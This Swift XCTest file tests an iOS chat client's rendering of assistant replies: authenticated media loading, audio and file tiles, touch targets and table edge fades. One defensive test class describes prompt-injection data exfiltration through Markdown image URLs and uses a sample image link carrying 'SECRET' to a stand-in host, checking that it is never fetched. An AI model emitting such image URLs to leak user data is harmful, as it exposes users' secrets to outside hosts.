import SwiftUI
import UIKit
import XCTest
@testable import Talaria
@testable import TalariaKit

/// TAL-186: an assistant body with server media renders as one Markdown document. Each image the server rewrote,
/// wherever the Markdown puts it, loads through the authenticated transcript loader as the server's item; the
/// App recognizes nothing in the text itself.
@MainActor
final class TranscriptMediaRenderingTests: XCTestCase {
    func testEveryImageTheServerRewroteLoadsThroughTheAuthenticatedLoader() async throws {
        let constructs = ["bold", "list", "quote", "linked", "inline"]
        let media = constructs.map { name in
            TranscriptMediaReference(url: "./api/media?path=%2Ftmp%2F\(name).png&session_id=s1", name: "\(name).png", mime: "image/png", mediaKind: .image)
        }
        let audio = TranscriptMediaReference(url: "./api/media?path=%2Ftmp%2Fclip.mp3&session_id=s1", name: "clip.mp3", mime: "audio/mpeg", mediaKind: .audio)
        let display = TranscriptDisplayBody(text: """
        **before ![Bold](\(media[0].url)) after**

        Plain text ![Inline](\(media[4].url)) around an image.

        - ![List](\(media[1].url))

        > ![Quote](\(media[2].url))

        [![Linked](\(media[3].url))](https://example.invalid/linked)

        Narration: [clip.mp3](\(audio.url))
        """, media: media + [audio])
        let message = ChatMessage(
            role: "assistant",
            content: "**before MEDIA:/tmp/bold.png after** …",
            timestamp: nil,
            messageId: "media-reply",
            displayBody: display
        )
        let loads = LoadRecorder()

        try hostInOwnWindow(MessageBubbleView(
            message: message,
            loadTranscriptMediaImage: { reference in
                loads.record(reference.url)
                return TestPNG.data
            },
            loadTranscriptMediaData: { _ in nil },
            // A fresh namespace: the decoded-image cache must not answer for another test's run.
            transcriptMediaCacheNamespace: "https://example.invalid|\(UUID().uuidString)"
        ), size: CGSize(width: 360, height: 900))

        _ = await awaitCondition { Set(loads.urls) == Set(media.map(\.url)) }
        XCTAssertEqual(Set(loads.urls), Set(media.map(\.url)), "Each construct's image loads as the server's item")
        XCTAssertFalse(loads.urls.contains(audio.url), "Audio renders as a tile, not an inline image")
    }

    /// TAL-971: a paragraph holding inline math still loads its other images through the authenticated loader.
    func testImageBesideInlineMathStillLoads() async throws {
        let image = TranscriptMediaReference(url: "./api/media?path=%2Ftmp%2Fplot.png&session_id=s1", name: "plot.png", mime: "image/png", mediaKind: .image)
        let display = TranscriptDisplayBody(text: "The value $M_S$ is plotted ![Plot](\(image.url)) here.", media: [image])
        let message = ChatMessage(role: "assistant", content: "The value $M_S$ is plotted MEDIA:/tmp/plot.png here.",
                                  timestamp: nil, messageId: "math-media-reply", displayBody: display)
        let loads = LoadRecorder()

        try hostInOwnWindow(MessageBubbleView(
            message: message,
            loadTranscriptMediaImage: { reference in
                loads.record(reference.url)
                return TestPNG.data
            },
            loadTranscriptMediaData: { _ in nil },
            transcriptMediaCacheNamespace: "https://example.invalid|\(UUID().uuidString)"
        ), size: CGSize(width: 360, height: 400))

        let loaded = await awaitCondition { loads.urls == [image.url] }
        XCTAssertTrue(loaded, "The image beside the math loaded \(loads.urls)")
    }

    /// TAL-753: the audio tile's export button keeps the 44 pt minimum touch target around its 15 pt glyph.
    func testAudioExportButtonHasAMinimumTouchTarget() async throws {
        let audio = TranscriptMediaReference(url: "./api/media?path=%2Ftmp%2Fclip.mp3&session_id=s1", name: "clip.mp3", mime: "audio/mpeg", mediaKind: .audio)
        let window = try hostInOwnWindow(
            TranscriptMediaAudioExportView(reference: audio, loadMediaData: { nil }),
            size: CGSize(width: 360, height: 200)
        )

        let button = try await requireElement(in: window, label: "Export audio clip.mp3")
        XCTAssertGreaterThanOrEqual(button.accessibilityFrame.width.rounded(), 44)
        XCTAssertGreaterThanOrEqual(button.accessibilityFrame.height.rounded(), 44)
    }

    /// TAL-2693: the file row's download button keeps the same 44 pt minimum touch target around its 15 pt glyph.
    func testFileDownloadButtonHasAMinimumTouchTarget() async throws {
        let file = TranscriptMediaReference(url: "./api/media?path=%2Ftmp%2Freport.pdf&session_id=s1", name: "report.pdf", mime: "application/pdf", mediaKind: .unsupported)
        let window = try hostInOwnWindow(
            TranscriptMediaFileExportView(reference: file, loadMediaData: { nil }),
            size: CGSize(width: 360, height: 200)
        )

        let button = try await requireElement(in: window, label: "Download report.pdf")
        XCTAssertGreaterThanOrEqual(button.accessibilityFrame.width.rounded(), 44)
        XCTAssertGreaterThanOrEqual(button.accessibilityFrame.height.rounded(), 44)
    }
}

/// TAL-2582: a streaming reply is raw Markdown the server has not rewritten yet. A remote image in it never loads by
/// itself, since its URL can carry data a prompt injection put there; it shows as a link named by its alt text, as the
/// server's display text shows it once the reply settles. Server media and an inline `data:` image still load.
@MainActor
final class RemoteMarkdownImageTests: XCTestCase {
    override func setUp() {
        super.setUp()
        RemoteImageRequests.start()
        addTeardownBlock { RemoteImageRequests.stop() }
    }

    func testStreamedRemoteImageShowsAsALinkAndIsNeverRequested() async throws {
        let window = try hostInOwnWindow(
            MarkdownRenderer(content: """
            The page asked for its chart:

            ![x](https://example.com/a.png?d=SECRET)

            And a badge ![y](https://example.com/b.png) inside a sentence, and a dot:

            ![dot](\(TestPNG.dataURL))

            # Heading ![h](https://example.com/h.png)

            | Cell |
            | --- |
            | ![t](https://example.com/t.png) |
            """, isStreaming: true),
            size: CGSize(width: 360, height: 800)
        )

        // A paragraph, a line of text, a heading and a table cell each draw their text through one view.
        for label in ["x", "y", "h", "t"] {
            let link = await awaitElement(in: window) { $0.accessibilityLabel == label && $0.accessibilityTraits.contains(.link) }
            XCTAssertNotNil(link, "The remote image \(label) shows as a link")
        }
        let dot = await awaitElement(in: window, label: "dot")
        XCTAssertTrue(dot?.accessibilityTraits.contains(.image) == true, "The data image still renders")
        XCTAssertEqual(RemoteImageRequests.urls, [], "Nothing is requested from example.com")
        attachHostedScreenshot(window, name: "streamed-remote-images")
    }

    /// A body the server rewrote keeps loading its own media through the authenticated loader beside a remote image.
    func testServerMediaStillLoadsBesideARemoteImage() async throws {
        let server = TranscriptMediaReference(url: "./api/media?path=%2Ftmp%2Fchart.png&session_id=s1", name: "chart.png", mime: "image/png", mediaKind: .image)
        let relayed = TranscriptMediaReference(url: "./api/remote-image?id=3445fe4e07acfe4b73f54106bd5f9507", name: "cat.png", mime: "image/png", mediaKind: .image)
        let display = TranscriptDisplayBody(text: """
        ![Chart](\(server.url))

        ![Cat](\(relayed.url))

        ![z](https://example.com/c.png)
        """, media: [server, relayed])
        let loads = LoadRecorder()
        let window = try hostInOwnWindow(
            TranscriptMediaContentView(
                markdown: display.text,
                display: display,
                cacheNamespace: "https://example.invalid|\(UUID().uuidString)",
                loadMediaImage: { reference in
                    loads.record(reference.url)
                    return TestPNG.data
                },
                loadMediaData: { _ in nil },
                onPreviewMedia: nil,
                isStreaming: false
            ),
            size: CGSize(width: 360, height: 700)
        )

        _ = await awaitCondition { Set(loads.urls) == [server.url, relayed.url] }
        XCTAssertEqual(Set(loads.urls), [server.url, relayed.url], "Server media loads as the server's items")
        let link = await awaitElement(in: window) { $0.accessibilityLabel == "z" && $0.accessibilityTraits.contains(.link) }
        XCTAssertNotNil(link, "The remote image shows as a link")
        XCTAssertEqual(RemoteImageRequests.urls, [], "Nothing is requested from example.com")
        attachHostedScreenshot(window, name: "server-media-beside-remote-image")
    }
}

/// A stub for `example.com`, the only host these tests' remote images name: it records each request and answers it
/// with the test PNG, so a remote image that loads is seen rather than reaching the network.
private final class RemoteImageRequests: URLProtocol {
    private static let lock = NSLock()
    nonisolated(unsafe) private static var recorded: [URL] = []
    static var urls: [URL] { lock.withLock { recorded } }

    static func start() {
        lock.withLock { recorded = [] }
        URLProtocol.registerClass(RemoteImageRequests.self)
    }

    static func stop() { URLProtocol.unregisterClass(RemoteImageRequests.self) }

    override class func canInit(with request: URLRequest) -> Bool { request.url?.host == "example.com" }
    override class func canonicalRequest(for request: URLRequest) -> URLRequest { request }

    override func startLoading() {
        guard let url = request.url else { return }
        Self.lock.withLock { Self.recorded.append(url) }
        let response = HTTPURLResponse(url: url, statusCode: 200, httpVersion: nil, headerFields: ["Content-Type": "image/png"])!
        client?.urlProtocol(self, didReceive: response, cacheStoragePolicy: .notAllowed)
        client?.urlProtocol(self, didLoad: TestPNG.data)
        client?.urlProtocolDidFinishLoading(self)
    }

    override func stopLoading() {}
}

@MainActor
private final class LoadRecorder {
    private(set) var urls: [String] = []
    func record(_ url: String) { urls.append(url) }
}

private enum TestPNG {
    static let data: Data = UIGraphicsImageRenderer(size: CGSize(width: 24, height: 16)).pngData { context in
        UIColor.systemTeal.setFill()
        context.fill(CGRect(x: 0, y: 0, width: 24, height: 16))
    }
    static let dataURL = "data:image/png;base64,\(data.base64EncodedString())"
}

/// TAL-772: a table wider than the chat fades only the edge that hides columns, as the composer strip does. The
/// header rule runs the table's full width, so its ink at each visible edge shows whether that edge fades.
@MainActor
final class ChatMarkdownTableEdgeFadeTests: XCTestCase {
    func testWideTableFadesTheEdgesThatHideColumns() throws {
        let table = try hostTable(columns: 7)
        XCTAssertGreaterThan(table.scroll.contentSize.width, table.scroll.bounds.width + 100, "The fixture overflows")

        var rule = try headerRule(in: table)
        XCTAssertGreaterThan(rule.leading, rule.middle * 0.7, "At rest the leading edge shows its column")
        XCTAssertLessThan(rule.trailing, rule.middle * 0.4, "At rest the trailing edge fades")
        attachHostedScreenshot(table.window, name: "wide-table-at-rest")

        table.scroll.setContentOffset(
            CGPoint(x: (table.scroll.contentSize.width - table.scroll.bounds.width) / 2, y: 0), animated: false
        )
        rule = try headerRule(in: table)
        XCTAssertLessThan(rule.leading, rule.middle * 0.4, "Mid-scroll the leading edge fades")
        XCTAssertLessThan(rule.trailing, rule.middle * 0.4, "Mid-scroll the trailing edge fades")
        attachHostedScreenshot(table.window, name: "wide-table-mid-scroll")
    }

    func testTableThatFitsHasNoFade() throws {
        let table = try hostTable(columns: 2)
        XCTAssertLessThanOrEqual(table.scroll.contentSize.width, table.scroll.bounds.width, "The fixture fits")

        let rule = try headerRule(in: table)
        XCTAssertGreaterThan(rule.leading, rule.middle * 0.7, "The leading edge shows its column")
        XCTAssertGreaterThan(rule.trailing, rule.middle * 0.7, "The trailing edge shows its column")
        attachHostedScreenshot(table.window, name: "narrow-table")
    }

    private struct HostedTable {
        let window: UIWindow
        let scroll: UIScrollView
    }

    private func hostTable(columns: Int) throws -> HostedTable {
        let row = { (cell: String) in "| " + (1...columns).map { "\(cell) \($0)" }.joined(separator: " | ") + " |" }
        let markdown = [row("Column"), "|" + String(repeating: " --- |", count: columns), row("Value"), row("Value")]
            .joined(separator: "\n")
        let window = try hostWindow(
            MarkdownRenderer(content: markdown)
                .padding(16)
                .frame(maxWidth: .infinity, maxHeight: .infinity, alignment: .top),
            size: HostedSize.phone,
            traits: { $0.userInterfaceStyle = .light }
        )
        let scroll = try XCTUnwrap(window.firstView(ofType: UIScrollView.self) { $0.bounds.width > 200 })
        return HostedTable(window: window, scroll: scroll)
    }

    /// The header rule's ink, its largest channel difference from the background, one point inside each visible edge
    /// of the table and at its middle.
    private func headerRule(in table: HostedTable) throws -> (leading: Double, middle: Double, trailing: Double) {
        let scale: CGFloat = 2
        let image = try XCTUnwrap(committedWindowImage(table.window, scale: scale))
        let data = try XCTUnwrap(image.dataProvider?.data)
        let bytes = try XCTUnwrap(CFDataGetBytePtr(data))
        let pixel = { (point: CGPoint) -> [Int] in
            let offset = Int(point.y * scale) * image.bytesPerRow + Int(point.x * scale) * (image.bitsPerPixel / 8)
            return (0..<3).map { Int(bytes[offset + $0]) }
        }
        let background = pixel(CGPoint(x: 2, y: 2))
        let ink = { (point: CGPoint) in Double(zip(pixel(point), background).map { abs($0 - $1) }.max() ?? 0) }

        let frame = table.scroll.convert(table.scroll.bounds, to: table.window)
        let visibleWidth = min(table.scroll.contentSize.width - table.scroll.contentOffset.x, frame.width)
        let leading = frame.minX + 1, trailing = frame.minX + visibleWidth - 1, middle = frame.minX + visibleWidth / 2
        // Text leaves gaps between words and columns; only a rule inks every sample across the middle half.
        let samples = stride(from: frame.minX + visibleWidth / 4, through: frame.minX + visibleWidth * 3 / 4, by: 2)
        let ruleY = try XCTUnwrap(
            stride(from: frame.minY, to: frame.maxY, by: 1 / scale).first { y in
                samples.allSatisfy { ink(CGPoint(x: $0, y: y)) > 8 }
            },
            "The header rule is drawn"
        )
        return (ink(CGPoint(x: leading, y: ruleY)), ink(CGPoint(x: middle, y: ruleY)), ink(CGPoint(x: trailing, y: ruleY)))
    }
}
